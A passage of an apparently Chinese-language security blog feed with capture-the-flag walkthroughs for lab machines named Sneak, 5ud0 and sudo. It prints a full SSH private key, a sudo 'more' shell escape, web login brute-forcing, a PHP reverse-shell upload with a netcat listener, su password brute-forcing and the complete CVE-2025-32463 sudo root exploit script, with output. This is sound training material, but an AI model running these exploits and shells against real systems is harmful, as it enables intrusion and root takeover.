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
==wBGUABDIQArFWZuNFQtRWYzl3cMAAAAkn2WUqipD5tU8
-----END OPENSSH PRIVATE KEY-----
               
```

出货啦，出货啦，哈哈哈

看着像ssh私钥，但是好像被处理过

看起来像单行反转，因为第一行的头是被rev的，第二行没问题，最后一行没问题，所以直接反转回去吧

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cd ~/tmp                                                  
            
┌──(kali㉿kali)-[~/tmp]
└─$ curl http://192.168.205.186/cms/license.txt -o id_rsa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  2602  100  2602    0     0  1267k      0 --:--:-- --:--:-- --:--:-- 2541k
                                                                                                                                                                                  
┌──(kali㉿kali)-[~/tmp]
└─$ awk 'NR%2==1 {system('echo \047'$0'\047 | rev'); next} 1' id_rsa &gt; id_rsa1
                                                                                                                                                                                  
┌──(kali㉿kali)-[~/tmp]
└─$ chmod 600 id_rsa1                                    
                                                                                                                                                                                  
┌──(kali㉿kali)-[~/tmp]
└─$ ssh-keygen -y -f id_rsa1
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMk/ZcOb/YUyfx7uI7lTYwamUZMR9vv6q97X+ga1pYrU0xLn910Czy+1chL3iNh7Ai45DepLnJrkRPejQ6TfeTmb2jL56R3YDygeIklQEPwI+y38FHg8wz44hir1CCcAn2dlV2Mi/MKtjVjMa2C8JYUWM065yTN5PMcrlY/1m6aAtJH8n7wpPh81SHYDY6C4KD8xF7yos5EMWhyuUa36Hg1R+uDFqgFCEl+Ixn3KBkDXFh0L/km0K5d4C8zr2NEQ5rEsDXfTb5Jn2hO7OJkGA7jtJDa917+e+X9sCdsB4PxFg5VzDWqREngHj7YoSd4QpQLgTC4Ca7YLP6RA2sQqpw9S/8ISOc4vnbbkdgDlYhRo49tLjAis97AtcxnhQImsNHmqHZWUmAbFuTHzpGOVhDmqLN3z/oZ8szRFG/yD7kowBGUhCbwfvGp1KgJYWGhpKE6zIwZA4CXndPHEox+LHXI+8IwXiQqiDOZw5HpFUD6NORUHzbUkpLd7jpjkOgqHs= sysadm@Sneak
```

连接

```
┌──(kali㉿kali)-[~/tmp]
└─$ ssh sysadm@192.168.205.186 -i id_rsa1
The authenticity of host '192.168.205.186 (192.168.205.186)' can't be established.
ED25519 key fingerprint is SHA256:O2iH79i8PgOwV/Kp8ekTYyGMG8iHT+YlWuYC85SbWSQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
    ~/.ssh/known_hosts:6: [hashed name]
    ~/.ssh/known_hosts:7: [hashed name]
    ~/.ssh/known_hosts:12: [hashed name]
    ~/.ssh/known_hosts:14: [hashed name]
    ~/.ssh/known_hosts:15: [hashed name]
    ~/.ssh/known_hosts:16: [hashed name]
    ~/.ssh/known_hosts:17: [hashed name]
    (13 additional names omitted)
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.205.186' (ED25519) to the list of known hosts.
Linux Sneak 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
sysadm@Sneak:~$ id
uid=1002(sysadm) gid=1003(sysadm) groups=1003(sysadm)
sysadm@Sneak:~$ sudo -l
Matching Defaults entries for sysadm on Sneak:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User sysadm may run the following commands on Sneak:
    (ALL) NOPASSWD: /usr/bin/more /var/log/custom/fake-cleanup.sh
```

more是个分页器所以你缩小屏幕执行/usr/bin/more /var/log/custom/fake-cleanup.sh让他一页显示不了就可以了

![image-20250715222326570](https://7r1umphk.github.io/image/20250715222326683.webp)

&gt; [!Tip]
&gt;
&gt; sudo /usr/bin/more /var/log/custom/fake-cleanup.sh
&gt; 然后显示百分比
&gt;
&gt; 输入!/bin/bash

```
root@Sneak:/home/sysadm# iduid=0(root) gid=0(root) groups=0(root                   
root@Sneak:/home/sysadm# cat /root/root.txt /home/user/user.txt 
flag{root-36bee2f8db4943b0f6c9d16afe11d454}                                         
flag{user-9fcae37cb857fb5fc6f8d74c82a5d0ga}                                         
```

或者改stty也可以

```
sysadm@Sneak:~$ stty rows 2
sysadm@Sneak:~$ sudo /usr/bin/more /var/log/custom/fake-cleanup.sh
# System cleanup script - DO NOT MODIFY
!/bin/bash
root@Sneak:/home/sysadm# id
uid=0(root) gid=0(root) groups=0(root)
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Sneak.html</guid><pubDate>Tue, 15 Jul 2025 14:34:06 +0000</pubDate></item><item><title>内部_5ud0</title><link>https://7r1UMPHK.github.io/post/nei-bu-_5ud0.html</link><description>![image-20250715211044032](https://7r1umphk.github.io/image/20250715211044343.webp)

这个打完了，补个wp

&gt; [!Tip]
&gt;
&gt; 群里搞了一个我们自己靶机的wp仓库，感兴趣的可以看一下
&gt; https://github.com/hyhforevertop/Mazesec-writeups

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l                                       
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.185 08:00:27:8e:cd:d9       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fb:d6:c6       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.954 seconds (131.01 hosts/sec). 4 responded
                                                                                     
```

192.168.205.185

探测服务

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.185  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 09:11 EDT
Nmap scan report for 192.168.205.185
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:8E:CD:D9 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.42 seconds
                                                                       
```

看web

![image-20250715211201958](https://7r1umphk.github.io/image/20250715211202294.webp)

随便点个超链接发现跳转textpattern.dsz

加个hosts

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo vim /etc/hosts                                                                            
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ tail -n 1 /etc/hosts                     
192.168.205.185 textpattern.dsz
                              
```

![image-20250715211441278](https://7r1umphk.github.io/image/20250715211441521.webp)

目录爆破

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ gobuster dir -u http://textpattern.dsz/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,txt,html,zip -t 64
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://textpattern.dsz/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 280]
/files                (Status: 301) [Size: 318] [--&gt; http://textpattern.dsz/files/]
/images               (Status: 301) [Size: 319] [--&gt; http://textpattern.dsz/images/]
/themes               (Status: 301) [Size: 319] [--&gt; http://textpattern.dsz/themes/]
/index.php            (Status: 200) [Size: 11506]
/sites                (Status: 301) [Size: 318] [--&gt; http://textpattern.dsz/sites/]
/css.php              (Status: 200) [Size: 0]
/.php                 (Status: 403) [Size: 280]
/README.txt           (Status: 200) [Size: 1152]
/INSTALL.txt          (Status: 200) [Size: 3080]
/LICENSE.txt          (Status: 200) [Size: 15170]
/rpc                  (Status: 301) [Size: 316] [--&gt; http://textpattern.dsz/rpc/]
Progress: 45805 / 1102800 (4.15%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 48835 / 1102800 (4.43%)
===============================================================
Finished
===============================================================
```

扒拉了一下，在README.txt看到了cms的版本号

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ curl http://textpattern.dsz/README.txt                          
Textpattern CMS 4.8.7

Released under the GNU General Public License.
See LICENSE.txt for terms and conditions.

Includes contributions licensed under the GNU Lesser General Public License.
See textpattern/lib/LICENSE-LESSER.txt for terms and conditions.

Includes contributions licensed under the New BSD License.
See textpattern/lib/LICENSE-BSD-3.txt for terms and conditions.


== About ==

Textpattern CMS is a flexible, elegant and easy-to-use content management
system. Textpattern is free and open source.


== Installing Textpattern ==

* Refer to INSTALL.txt for details.


== Upgrading Textpattern ==

* Refer to UPGRADE.txt for details.


== Resources ==

* Website:       https://textpattern.com/
* Support forum: https://forum.textpattern.com
* Documentation: https://docs.textpattern.com

* Social:        https://textpattern.com/twitter

* Development:   https://textpattern.com/github
* Contributing:  https://docs.textpattern.com/development/contributing

* Sponsor:       https://github.com/sponsors/textpattern
                 https://opencollective.com/textpattern-collective
* Donate:        https://textpattern.com/about/patrons
                                                  
```

Textpattern CMS 4.8.7，google了一下，看到了一个远程命令执行和上传漏洞，所以还是需要爆破一下用户密码
![image-20250715211701681](https://7r1umphk.github.io/image/20250715211701938.webp)

点这里会跳转登录或者访问    http://textpattern.dsz/textpattern/

随便输入点抓包

![image-20250715211818852](https://7r1umphk.github.io/image/20250715211819190.webp)

只可以硬爆，巨慢

![image-20250715212036753](https://7r1umphk.github.io/image/20250715212037141.webp)

![image-20250715212123475](https://7r1umphk.github.io/image/20250715212123818.webp)

密码就rockyou.txt，不截图了

然后开启，等就好了

![image-20250715212254371](https://7r1umphk.github.io/image/20250715212254743.webp)

admin:superman

![image-20250715212344044](https://7r1umphk.github.io/image/20250715212344398.webp)

上传一个reverse.php上去就好了

kali监听

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888           
listening on [any] 8888 ...
```

![image-20250715212430424](https://7r1umphk.github.io/image/20250715212430750.webp)

去http://textpattern.dsz/files/

![image-20250715212454872](https://7r1umphk.github.io/image/20250715212455203.webp)

点击，转圈圈

回去看监听

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nc -lvnp 8888           
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.185] 38534
Linux 5ud0 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64 GNU/Linux
 09:24:54 up 14 min,  0 users,  load average: 0.00, 0.03, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (500): Inappropriate ioctl for device
bash: no job control in this shell
www-data@5ud0:/$ ls /home
ls /home
todd
www-data@5ud0:/$ su todd
su todd
Password: todd
su: Authentication failure
www-data@5ud0:/$ ls -la /opt
ls -la /opt
total 8
drwxr-xr-x  2 root root 4096 Jul  9 21:31 .
drwxr-xr-x 18 root root 4096 Jul 10 04:36 ..
www-data@5ud0:/$ find / -perm -4000 -type f 2&gt;/dev/null
find / -perm -4000 -type f 2&gt;/dev/null
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/passwd
/usr/local/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

试了一下弱密码不行，然后看了一下suid，发现有两个sudo

/usr/bin/sudo

/usr/local/bin/sudo

对比一下

```
www-data@5ud0:/$ diff /usr/bin/sudo /usr/local/bin/sudo
diff /usr/bin/sudo /usr/local/bin/sudo
Binary files /usr/bin/sudo and /usr/local/bin/sudo differ
```

而且这个靶机名字就叫5ud0，所以很怀疑

```
www-data@5ud0:/$ /usr/bin/sudo -V
/usr/bin/sudo -V
Sudo version 1.9.16p2
Sudoers policy plugin version 1.9.16p2
Sudoers file grammar version 50
Sudoers I/O plugin version 1.9.16p2
Sudoers audit plugin version 1.9.16p2
www-data@5ud0:/$ /usr/local/bin/sudo -V
/usr/local/bin/sudo -V
Sudo version 1.9.6
Sudoers policy plugin version 1.9.6
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.6
Sudoers audit plugin version 1.9.6
```

/usr/local/bin/sudo是比较新的版本，/usr/bin/sudo是1.9.16p2的，这个版本好像前端时间爆出了一个漏洞，google一下

![image-20250715212901470](https://7r1umphk.github.io/image/20250715212901701.webp)

群里前段时间也提了一下，不过我们现在需要先~~拿个知道密码的用户，www-data的密码我可不知道~~ （纯小丑，CVE-2025-32463不需要密码就可以利用）

todd没有找到什么有意思的东西，那爆破密码吧

先稳定一下shell

```
script /dev/null -c bash
Ctrl+Z
stty raw -echo; fg
reset xterm  
export TERM=xterm  
export SHELL=/bin/bash  
stty rows 24 columns 80
```

```
www-data@5ud0:/tmp$ busybox wget 192.168.205.128/rockyou.txt
Connecting to 192.168.205.128 (192.168.205.128:80)
rockyou.txt          100% |********************************|  133M  0:00:00 ETA
www-data@5ud0:/tmp$ busybox wget 192.168.205.128/suForce
Connecting to 192.168.205.128 (192.168.205.128:80)
suForce              100% |********************************|  2430  0:00:00 ETA
www-data@5ud0:/tmp$ chmod +x suForce 
www-data@5ud0:/tmp$ ./suForce 
            _____                          
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
 ❓  Usage: suForce [OPTIONS]

 🌐  Get a user password with the su binary.

 📋  Options:
       -u &lt;USER&gt;      Specify the username you want to attack.
       -w &lt;WORDLIST&gt;  Specify the path where the wordlist is located.
       -h             Display this help message and exit.

 💡  Examples:
       suForce -u root -w rockyou.txt
       suForce -h 

───────────────────────────────────

```

我这偷个鸡，我知道是9000行左右的，我提取1w行，然后从后往前爆破

```
www-data@5ud0:/tmp$ head -n 10000 rockyou.txt |tac &gt; passwd.txt
www-data@5ud0:/tmp$ ls -al passwd.txt 
-rw-rw-rw- 1 www-data www-data 80577 Jul 15 09:41 passwd.txt
www-data@5ud0:/tmp$ ./suForce -u todd -w passwd.txt 
            _____                          
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
🎯 Username | todd
📖 Wordlist | passwd.txt
🔎 Status   | 8/10000/0%/nopassword
💥 Password | nopassword
───────────────────────────────────

```

登上去

```
www-data@5ud0:/tmp$ su todd
Password: 
todd@5ud0:/tmp$ id
uid=1000(todd) gid=1000(todd) groups=1000(todd)
```

https://github.com/pr0v3rbs/CVE-2025-32463_chwoot

漏洞poc

```
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

if [ $# -eq 0 ]; then
    # If no command is provided, default to an interactive root shell.
    CMD='/bin/bash'
else
    # Otherwise, use the provided arguments as the command to execute.
    CMD='$@'
fi

# Escape the command to safely include it in a C string literal.
# This handles backslashes and double quotes.
CMD_C_ESCAPED=$(printf '%s' '$CMD' | sed -e 's/\\/\\\\/g' -e 's/'/\\'/g')

cat &gt; woot1337.c&lt;&lt;EOF
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;

__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir('/');
  execl('/bin/sh', 'sh', '-c', '${CMD_C_ESCAPED}', NULL);
}
EOF

mkdir -p woot/etc libnss_
echo 'passwd: /woot1337' &gt; woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo 'woot!'
sudo -R woot woot
rm -rf ${STAGE?}
```

直接复制进去，不想下载了

```
todd@5ud0:/tmp$ vim a.sh
todd@5ud0:/tmp$ head -n 5 a.sh 
#!/bin/bash
# sudo-chwoot.sh
# CVE-2025-32463 – Sudo EoP Exploit PoC by Rich Mirch
#                  @ Stratascale Cyber Research Unit (CRU)
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
```

改点东西

![image-20250715214543419](https://7r1umphk.github.io/image/20250715214543644.webp)

改成有漏洞的

```
todd@5ud0:/tmp$ bash a.sh 
woot!
[sudo] password for todd: 
root@5ud0:/# id
uid=0(root) gid=0(root) groups=0(root),1000(todd)
root@5ud0:/# cat /root/root.txt /home/todd/user.txt 
flag{root-257f425d-1ea4-4b8e-8dd8-69523f25d249}
flag{user-80e68759-1ca0-45eb-82a7-601b1f78dfe5}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_5ud0.html</guid><pubDate>Tue, 15 Jul 2025 13:47:40 +0000</pubDate></item><item><title>内部_sudo</title><link>https://7r1UMPHK.github.io/post/nei-bu-_sudo.html</link><description>![image-20250711174235043](https://7r1umphk.github.io/image/20250711174242755.webp)

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ sudo arp-scan -l
[sudo] kali 的密码：
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.205.1   00:50:56:c0:00:08       VMware, Inc.
192.168.205.2   00:50:56:fc:94:2f       VMware, Inc.
192.168.205.175 08:00:27:14:e1:21       PCS Systemtechnik GmbH
192.168.205.254 00:50:56:fa:75:ed       VMware, Inc.

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 1.997 seconds (128.19 hosts/sec). 4 responded
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nmap -p- 192.168.205.175
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-11 05:42 EDT
Nmap scan report for 192.168.205.175
Host is up (0.00015s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:14:E1:21 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.25 seconds
                       
```

看web

![image-20250711174336944](https://7r1umphk.github.io/image/20250711174337092.webp)

跳转不过去，拦一下jsdelivr的

![image-20250711174539493](https://7r1umphk.github.io/image/20250711174539834.webp)

跳转到

![image-20250711174433367](https://7r1umphk.github.io/image/20250711174433533.webp)

nuclei看看架构

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ nuclei -u http://192.168.205.175/tinyfilemanager.php

                     __     _
   ____  __  _______/ /__  (_)
  / __ \/ / / / ___/ / _ \/ /
 / / / / /_/ / /__/ /  __/ /
/_/ /_/\__,_/\___/_/\___/_/   v3.4.5

                projectdiscovery.io

[INF] Current nuclei version: v3.4.5 (outdated)
[INF] Current nuclei-templates version: v10.2.4 (latest)
[WRN] Scan results upload to cloud is disabled.
[INF] New templates added in latest release: 67
[INF] Templates loaded for current scan: 8150
[INF] Executing 7946 signed templates from projectdiscovery/nuclei-templates
[WRN] Loading 204 unsigned templates for scan. Use with caution.
[INF] Targets loaded for current scan: 1
[INF] Templates clustered: 1761 (Reduced 1653 Requests)
[INF] Using Interactsh Server: oast.pro
[cookies-without-httponly] [javascript] [info] 192.168.205.175 ['filemanager']
[cookies-without-secure] [javascript] [info] 192.168.205.175 ['filemanager']
[waf-detect:apachegeneric] [http] [info] http://192.168.205.175/tinyfilemanager.php
[ssh-sha1-hmac-algo] [javascript] [info] 192.168.205.175:22
[ssh-password-auth] [javascript] [info] 192.168.205.175:22
[ssh-auth-methods] [javascript] [info] 192.168.205.175:22 ['['publickey','password']']
[ssh-server-enumeration] [javascript] [info] 192.168.205.175:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3']
[openssh-detect] [tcp] [info] 192.168.205.175:22 ['SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u3']
[form-detection] [http] [info] http://192.168.205.175/tinyfilemanager.php
[tiny-file-manager] [http] [info] http://192.168.205.175/tinyfilemanager.php/index.php
[http-missing-security-headers:clear-site-data] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:strict-transport-security] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:content-security-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:x-frame-options] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:x-content-type-options] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:permissions-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://192.168.205.175/tinyfilemanager.php
[http-missing-security-headers:referrer-policy] [http] [info] http://192.168.205.175/tinyfilemanager.php
[tech-detect:jsdelivr] [http] [info] http://192.168.205.175/tinyfilemanager.php
[tech-detect:bootstrap] [http] [info] http://192.168.205.175/tinyfilemanager.php
[apache-detect] [http] [info] http://192.168.205.175/tinyfilemanager.php ['Apache/2.4.62 (Debian)']
[INF] Scan completed in 1m. 24 matches found.
                          
```

搜一下有没有洞

```
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ searchsploit tiny file manager
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                  |  Path
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Manx 1.0.1 - '/admin/tiny_mce/plugins/ajaxfilemanager/ajax_get_file_listing.php' Multiple Cross-Site Scripting Vulnerabilities                  | php/webapps/36364.txt
Manx 1.0.1 - '/admin/tiny_mce/plugins/ajaxfilemanager_OLD/ajax_get_file_listing.php' Multiple Cross-Site Scripting Vulnerabilities              | php/webapps/36365.txt
MCFileManager Plugin for TinyMCE 3.2.2.3 - Arbitrary File Upload                                                                                | php/webapps/15768.txt
Tiny File Manager 2.4.6 - Remote Code Execution (RCE)                                                                                           | php/webapps/50828.sh
TinyMCE MCFileManager 2.1.2 - Arbitrary File Upload                                                                                             | php/webapps/15194.txt
------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x]
└─$ cd tmp                        
                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ searchsploit -m php/webapps/50828.sh
  Exploit: Tiny File Manager 2.4.6 - Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50828
     Path: /usr/share/exploitdb/exploits/php/webapps/50828.sh
    Codes: CVE-2021-45010, CVE-2021-40964
 Verified: False
File Type: Unicode text, UTF-8 text
Copied to: /mnt/hgfs/gx/x/tmp/50828.sh


                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ bash /mnt/hgfs/gx/x/tmp/50828.sh

TIny File Manager Authenticated RCE Exploit.

By FEBIN

/mnt/hgfs/gx/x/tmp/50828.sh &lt;URL&gt; &lt;Admin Username&gt; &lt;Password&gt;

Example: /mnt/hgfs/gx/x/tmp/50828.sh http://files.ubuntu.local/index.php admin 'admin@123'

                                                                                                                                                                                  
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ bash /mnt/hgfs/gx/x/tmp/50828.sh http://192.168.205.175/tinyfilemanager.php admin 'admin@123'
/usr/bin/curl
[✔] Curl found! 
/usr/bin/jq
[✔] jq found! 

[+]  Login Success! Cookie: filemanager=70k14rakb4d73nos0gib5frd7d 
jq: parse error: Invalid numeric literal at line 1, column 14
[-] Can't find WEBROOT! Using default /var/www/html 
[-] File Upload Unsuccessful! Exiting! 
                                           
```

失败，但是默认密码登录成功了，所以我们去web自己上传

![image-20250711175333897](https://7r1umphk.github.io/image/20250711175334236.webp)

成了，什么限制都没有，直接访问，拿shell（这个架构。群主好像打过）

```
